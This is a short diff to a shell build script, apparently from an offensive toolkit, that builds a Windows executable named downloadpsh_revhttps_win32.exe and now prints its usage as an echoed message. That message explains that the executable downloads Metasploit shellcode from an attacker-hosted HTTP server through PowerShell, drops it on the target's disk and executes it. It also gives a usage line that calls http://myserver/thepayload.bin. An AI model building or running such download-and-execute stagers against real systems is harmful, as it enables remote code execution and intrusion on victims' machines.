@@ -55,10 +55,9 @@ strip output/downloadpsh_revhttps_win32.exe
 # cleanup
 cleanup_techniques
 
-
-# The generated msf shellcode must be hosted on a HTTP server.
-# Call your executable like:
-# output.exe http://myserver/thepayload.bin
-# The executable will then download the file via powershell and drop it on the target's disk.
-# The downloaded shellcode is then read from the file and executed.
+echo "The generated msf shellcode must be hosted on a HTTP server.\n
+Call your executable like:\n
+downloadpsh_revhttps_win32.exe http://myserver/thepayload.bin\n
+The executable will then download the file via powershell and drop it on the target's disk.\n
+The downloaded shellcode is then read from the file and executed."
 
